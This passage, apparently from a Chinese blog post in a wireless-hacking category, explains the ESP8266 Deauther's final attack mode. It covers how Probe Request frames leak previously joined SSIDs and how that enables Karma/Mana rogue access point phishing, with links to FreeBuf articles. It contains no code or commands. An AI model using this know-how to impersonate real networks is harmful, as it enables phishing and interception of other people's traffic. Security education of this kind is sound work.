<h1 id="0x06-补充说明"><a href="#0x06-补充说明" class="headerlink" title="0x06 补充说明"></a>0x06 补充说明</h1><p>可能大家对ESP8266 Deauther的最后一个攻击模式不太清楚，这里引用天马安全团队杨大佬的文章来解释一下:我们所使用的无线客户端设备在连接无线AP时会采用两种扫描方法，主动扫描和被动扫描。在主动扫描中，客户端发送Probe Request,接收由AP发回的Probe Response。在被动扫描中，客户端在每个频道监听AP周期性发送的Beacon无线数据帧。之后是认证(Authentication)和连接(Association)过程。<br>说白了就是我们所使用的无线客户端(例如手机，平板，笔记本等设备)在连接WiFi的时候也会向外广播一个无线数据帧，这个无线数据帧就是<strong>Probe Request</strong>帧,这个数据帧里面包含了我们的无线设备曾经连过哪些WiFi，它们的SSID是什么，MAC地址等等，而无线AP接收到这个数据帧之后也会进行回复响应，回复给无线客户端设备另外一个数据帧-<strong>Probe Response</strong>帧，这样就可以做到无线客户端设备和无线AP设备之间的快速连接。<br>但是这个特性也可以被黑客给利用，黑客可以监听空气中的无线数据包，分析里面的内容，可以抓到这个Probe Request帧，得到里面包含的无线客户端设备曾经连过的WiFi热点的SSID,MAC地址，从而伪造一个同名同MAC地址的无线接入点来实施钓鱼攻击。这就是后来的Karma和Mana攻击的原理！具体的内容可以看看FreeBuf上的相关文章，我这个菜鸡就不在这里班门弄斧了！</p>
<blockquote>
<p><a href="https://www.freebuf.com/articles/wireless/145259.html">聊聊WiFi Hacks：为何你的Karma攻击不好使了</a></p>
<p><a href="https://www.freebuf.com/column/144882.html">WiFi Pineapple的Karma攻击与原理探究</a></p>
<p><a href="https://www.freebuf.com/articles/77055.html">WiFi Pineapple的Karma攻击与原理探究</a></p>
<p><a href="https://www.freebuf.com/articles/wireless/44378.html">主动触发被动模式从而挟持无线客户端 – Passive Karma Attack</a></p>
</blockquote>
]]></content>
      <categories>
        <category>wireless-hacking</category>
      </categories>
      <tags>
        <tag>esp8266</tag>
        <tag>wifi</tag>
        <tag>wireless</tag>
      </tags>
  </entry>
</search>
